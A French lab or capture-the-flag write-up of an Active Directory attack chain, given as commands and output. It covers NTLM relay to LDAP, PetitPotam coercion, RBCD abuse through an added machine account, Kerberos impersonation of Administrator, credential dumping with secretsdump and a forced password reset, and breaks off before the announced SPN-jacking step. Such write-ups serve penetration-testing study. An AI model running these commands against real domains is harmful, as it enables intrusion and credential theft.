# NTLM Relay & Delegation Abuse → Domain Compromise

## 📖 Présentation du contexte

Un accès initial est obtenu sur `TARGET_IP` avec un compte à privilèges limités (`LOW_PRIV_USER`).

La machine compromise est le contrôleur de domaine du domaine `LAB.DOMAIN`.

Lors de l’énumération, une seconde interface réseau interne est découverte, révélant un réseau non accessible directement depuis la machine attaquante.

Une seconde machine, nommée `MACHINE_2`, est identifiée sur ce réseau et héberge un serveur web.

L’analyse de l’environnement Active Directory met également en évidence plusieurs relations de délégation et permissions intéressantes entre différents comptes utilisateurs.


## 🔎 Découverte menant à la chaîne d’attaque

Les éléments suivants sont identifiés :
- Présence d’un réseau interne accessible uniquement depuis `TARGET_IP`
- SMB Signing désactivé sur `MACHINE_2`
- Possibilité de forcer une modification de mot de passe entre comptes utilisateurs
- Permissions de type WriteSPN sur le contrôleur de domaine
- Opportunités d’abus de délégation Kerberos

Pris individuellement, ces éléments semblent limités, mais leur combinaison permet la construction d’une chaîne d’attaque complète menant à une compromission du domaine.


## 🔗 Chaîne d’attaque

1. Accès initial avec `LOW_PRIV_USER`
2. Mise en place d’un tunnel réseau via **Ligolo**
3. Accès à `MACHINE_2` depuis le réseau interne avec `LOW_PRIV_USER`
4. Relais NTLM vers LDAP du contrôleur de domaine
5. NTLM coercion afin de provoquer une authentification machine
6. Obtention d’un shell LDAP interactif au nom de `MACHINE_2`
7. Abus de **Resource-Based Constrained Delegation (RBCD)**
8. Ajout d’une nouvelle machine contrôlée dans le domaine
9. Impersonation Kerberos permettant un accès administrateur sur `MACHINE_2`
10. Récupération d’identifiants supplémentaires pour le compte `BOB`
11. Modification du mot de passe du compte `BOB_ADMIN`
12. Identification que `BOB_ADMIN` possède :
    - une **constrained delegation** vers un SPN de `MACHINE_2`
    - l’attribut **WriteSPN** sur le contrôleur de domaine
13. Déplacement du SPN concerné de `MACHINE_2` vers le contrôleur de domaine (*SPN Jacking*)
14. Impersonation de l’Administrator du domaine via Kerberos
15. Accès administrateur complet au contrôleur de domaine


## ⚙️ Mise en œuvre de la chaîne d’attaque

La mise en place du pivot réseau nécessaire à l’accès au réseau interne
n’est pas détaillée ici.

Une fois l’accès réseau établi vers `MACHINE_2`, l’attaque débute par
la mise en place d’un relais NTLM ciblant le service LDAP du contrôleur
de domaine.

---

## 1. Mise en place du relais NTLM

### Objectif
Relayer une authentification NTLM vers LDAP afin d’obtenir des droits
sur un objet Active Directory.

### Conditions nécessaires
- SMB Signing désactivé sur `MACHINE_2`,
- accès réseau au contrôleur de domaine,
- relais LDAP autorisé.

### Commande sur Kali

```
└─$ impacket-ntlmrelayx -t ldap://X.X.X.X -smb2support --remove-mic -i
```
L'option "--remove-mic" permet de bypasser certaines protections NTLM modernes.  
L'option "-i" permet d'obtenir un shell interactif.  
L'option "-smb2support" permet de supporter le protocole SMB2.  
X.X.X.X est l'adresse IP du controleur de domaine.


### Explication

Le relais permet de transformer une authentification NTLM entrante
en requête LDAP authentifiée auprès du contrôleur de domaine.

---

## 2. NTLM Coercion

### Objectif
Forcer `MACHINE_2` à initier une authentification NTLM vers
`ATTACKER_HOST` afin qu’elle soit relayée vers LDAP.

### Principe
Certaines fonctionnalités Windows permettent de déclencher une
authentification machine vers un serveur distant.

### Outil de coercition

Utilisation de petipotam.py accessible ici :  
https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py

### Commande sur Kali

```
└─$ python petitpotam.py -u `LOW_PRIV_USER` -hashes `LOW_PRIV_USER_HASH` -d `LAB.DOMAIN` `ATTACKER_HOST_IP` `MACHINE_2_IP`
```

### Résultat

L’authentification NTLM de `MACHINE_2` est relayée vers le contrôleur de domaine. 
<img width="988" height="138" alt="image" src="https://github.com/user-attachments/assets/89ab36b7-63da-4caa-a81c-14ea14a83f0a" />


---

## 3. Obtention d’un accès LDAP interactif

### Objectif
Utiliser l’authentification relayée pour manipuler les objets
Active Directory.

### Commande sur kali

```
nc 127.0.0.1 11000                             
Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control [search_base] target grantee - Grant full control on a given target object (sAMAccountName or search filter, optional search base) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.

# whoami
u:LAB.DOMAIN\MACHINE_2$

```

### Résultat

Le relais NTLM permet d’interagir avec LDAP en tant que `MACHINE_2`.

### Implications

Cela permet notamment :
- la modification d'attributs AD
- l’abus de délégation
- la création d’objets machine

---

## 4. Abus de Resource-Based Constrained Delegation

### Principe

RBCD permet à un service de déléguer l’authentification
d’un utilisateur vers une autre ressource.

### Exploitation

En contrôlant certains attributs LDAP, il devient possible
d'autoriser une machine contrôlée par l’attaquant à déléguer
l’authentification vers `MACHINE_2`.

### Commandes LDAP

```
# add_computer ATTACKER Password123!
Attempting to add a new computer with the name: ATTACKER$
Inferred Domain DN: DC=lab,DC=domain
Inferred Domain Name: lab.domain
New Computer DN: CN=ATTACKER,CN=Computers,DC=lab,DC=domain
Adding new computer with username: ATTACKER$ and password: Password123! result: OK

# set_rbcd MACHINE_2$ ATTACKER$
Found Target DN: CN=MACHINE_2,CN=Computers,DC=lab,DC=domain
Target SID: XXXXXXXXXX

Found Grantee DN: CN=ATTACKER,CN=Computers,DC=lab,DC=domain
Grantee SID: YYYYYYYYYY
Delegation rights modified successfully!
ATTACKER$ can now impersonate users on MACHINE_2$ via S4U2Proxy
```

### Résultat

La nouvelle machine `ATTACKER$` peut désormais impersonner des users sur MACHINE_2, notamment le user Administrator

---

## 5. Impersonation Kerberos

### Objectif
Obtenir un ticket Kerberos permettant d’agir comme un utilisateur
à privilèges élevés.

### Principe

La délégation configurée permet de demander un ticket Kerberos
au nom d’un autre utilisateur.

### Commandes sur Kali

```
└─$ impacket-getST -spn host/MACHINE_2.lab.domain -impersonate Administrator lab.domain/ATTACKER$:Password123!
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

└─$ export KRB5CCNAME=Administrator.ccache

└─$ impacket-wmiexec -k -no-pass MACHINE_2.lab.domain
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
MACHINE_2

C:\>whoami
lab\administrator
```

### Résultat

Accès administrateur sur `MACHINE_2`.

---

## 6. Exploitation des accès administrateur sur `MACHINE_2`

### Objectif
Utiliser l’accès administrateur pour récupérer de nouveaux
identifiants et poursuivre l’attaque.

### Action

Extraction de credentials présents sur la machine.

### Commande sur Kali

```
└─$ impacket-secretsdump MACHINE_2.lab.domain -k -no-pass                      
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
...
...
...
[*] DefaultPassword 
LAB\bob:Password123!
...
...
...
```

### Résultat
Récupération des credentials du user `BOB`

---

## 7. Abus de permissions Active Directory

### Contexte

<img width="831" height="824" alt="image" src="https://github.com/user-attachments/assets/4845fc77-838a-4b19-8950-792e89fe6878" />

### Principe

Changer le mot de passe d'un compte grâce à l'attribut "ForceChangePassword".

## Commande sur Kali

```
└─$ net rpc password `BOB_ADMIN` "newP@ssword2022" -U "LAB.DOMAIN"/"BOB"%"Password123!" -S "DC.lab.domain"
```

## Résultat

Le mot de passe du compte `BOB_ADMIN` est correctement changé sans connaître le précédent le mot de passe.

---


